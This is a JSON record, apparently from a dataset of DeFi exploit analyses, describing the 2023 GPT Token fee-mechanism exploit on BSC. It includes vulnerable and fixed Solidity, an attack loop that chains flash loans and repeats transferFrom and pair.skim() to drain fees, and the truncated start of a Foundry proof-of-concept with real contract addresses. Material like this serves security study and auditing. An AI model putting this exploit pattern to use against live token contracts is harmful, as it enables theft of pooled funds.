@@ -1,0 +1,52 @@
+{
+ "id": "2023__2023-05-24_GPTToken_FeeMechanism_BSC",
+ "source_file": "2023/2023-05-24_GPTToken_FeeMechanism_BSC.md",
+ "title": "GPT Token — Fee Mechanism Exploitation Analysis",
+ "date": "2023-05-24",
+ "protocol": "GPT Token",
+ "chain": "BSC",
+ "loss_raw": "~$155,000 BUSD",
+ "loss_usd": 155000.0,
+ "root_cause": "Flawed fee distribution logic in GPT token `_transfer` — unlimited fee extraction via `pair.skim()`",
+ "attack_tx": "0xb77c...391",
+ "vulnerable_contract": null,
+ "classes": [
+  "business-logic",
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "// ❌ Vulnerability: fee is transferred directly to the pair address,\n//                  but the pair's reserve is not updated until sync() or swap() is called\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    uint256 fee = 0;\n\n    // ❌ When transferring fee to LP pair, pair.reserve is not updated\n    if (to == address(lpPair) || from == address(lpPair)) {\n        fee = amount * feeRate / 100;           // ❌ e.g. 5% fee\n        super._transfer(from, address(lpPair), fee);   // ❌ balanceOf(pair) increases\n        // ❌ Problem: pair.reserve remains unchanged\n        //             resulting in balanceOf(pair) > pair.reserve\n    }\n\n    // Actual transfer (after fee deduction)\n    super._transfer(from, to, amount - fee);\n}",
+  "// ❌ PancakeSwap V2 UniswapV2Pair.skim() — immutable external contract\nfunction skim(address to) external lock {\n    address _token0 = token0;\n    address _token1 = token1;\n    // ❌ Transfers the difference between balanceOf and reserve to the `to` address — allows draining accumulated fees\n    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n}",
+  "// ❌ Attack loop: sync() → swap → fee accumulation → skim() extraction, repeated\npair.sync();  // ❌ Reset reserve to current balance (fees will re-accumulate on subsequent swaps)\n\n// Large BUSD → GPT swap: transfer fees accumulate in the pair\nrouter.swapExactTokensForTokens(100_000 ether, 0, path, address(this), block.timestamp + 100);\n\n// ❌ 50 iterations: send small GPT + skim() to continuously extract accumulated fees\nfor (uint256 i = 0; i < 50; ++i) {\n    GPT.transferFrom(address(this), address(pair), 0.5 ether);  // ❌ Triggers additional fee accumulation\n    pair.skim(address(this));  // ❌ Extracts entire accumulated fee balance\n}"
+ ],
+ "code_after": [
+  "// ✅ Send fee to a dedicated fee collection address,\n//    or immediately call pair.sync() to synchronize reserves\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    uint256 fee = 0;\n\n    if (to == address(lpPair) || from == address(lpPair)) {\n        fee = amount * feeRate / 100;\n        // ✅ Send fee to a separate treasury address to prevent pair discrepancy\n        super._transfer(from, feeRecipient, fee);\n    }\n\n    super._transfer(from, to, amount - fee);\n\n    // ✅ Alternatively, immediately call pair.sync() to synchronize reserves\n    // IUniswapV2Pair(lpPair).sync();\n}",
+  "// ✅ Fix 1: Send fees to a dedicated treasury rather than the pair\naddress public feeRecipient;  // ✅ Set dedicated fee address\n\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    uint256 fee = 0;\n\n    // ✅ When fee is triggered on LP pair transfers, send directly to treasury\n    if (to == address(lpPair) || from == address(lpPair)) {\n        fee = amount * feeRate / 100;\n        // ✅ Send to separate fee recipient address, not the pair\n        super._transfer(from, feeRecipient, fee);\n    }\n\n    super._transfer(from, to, amount - fee);\n    // ✅ No discrepancy between pair.reserve and balanceOf\n}"
+ ],
+ "steps": [
+  "**Step 2 — Chained Flash Loans (oracle2 → oracle5):**",
+  "**Step 4 — Large BUSD → GPT Swap:**",
+  "- Repeat `GPT.transferFrom(this → pair, 0.5 ether)` + `pair.skim(this)`",
+  "**Step 6 — GPT → BUSD Reverse Swap:**",
+  "- Repay BUSD in reverse order: oracle5 → oracle4 → oracle3 → oracle2 → oracle1",
+  "1. flashLoan(BUSD)",
+  "oracle1 → oracle2 → oracle3 → oracle4 → oracle5",
+  "2. Hold large BUSD balance",
+  "3. Reserves reset",
+  "PancakeSwap: BUSD → GPT Swap (100,000 BUSD)",
+  "GPT._transfer() fee → accumulates in pair address",
+  "4. Fee accumulated",
+  "50-Iteration Loop",
+  "GPT.transferFrom(attacker → pair, 0.5 GPT)",
+  "→ Trigger additional fee accumulation (_transfer)",
+  "→ Extract entire balanceOf(pair) - reserve",
+  "5. Hold large GPT balance",
+  "PancakeSwap: GPT → BUSD Reverse Swap",
+  "6. Realize BUSD profit",
+  "oracle5 → oracle4 → oracle3 → oracle2 → oracle1"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────────┐\n│                     Attacker Contract                     │\n└──────────────────────┬──────────────────────────────────┘\n                       │ 1. flashLoan(BUSD)\n                       ▼\n┌─────────────────────────────────────────────────────────┐\n│           DODO DPP Oracle ×5 (Chained Flash Loans)       │\n│  oracle1 → oracle2 → oracle3 → oracle4 → oracle5        │\n│            (accumulate BUSD from each oracle)            │\n└──────────────────────┬──────────────────────────────────┘\n                       │ 2. Hold large BUSD balance\n                       ▼\n┌─────────────────────────────────────────────────────────┐\n│                  pair.sync()                             │\n│       reserve0, reserve1 ← sync with current ba",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// [Step 1] Import required interfaces and contracts\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\ncontract CSExp is Test, IDODOCallee {\n    // [Setup] 5 DODO DPP Oracles — sources for chained flash loans\n    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);\n    IDPPOracle oracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);\n    IDPPOracle oracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);\n    IDPPOracle oracle4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);\n    IDPPOracle oracle5 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);\n\n    // [Setup] GPT/BUSD PancakeSwap LP pair and router\n    IPancakePair pair = IPancakePair(0x77a684943aA033e2E"
+ ]
+}
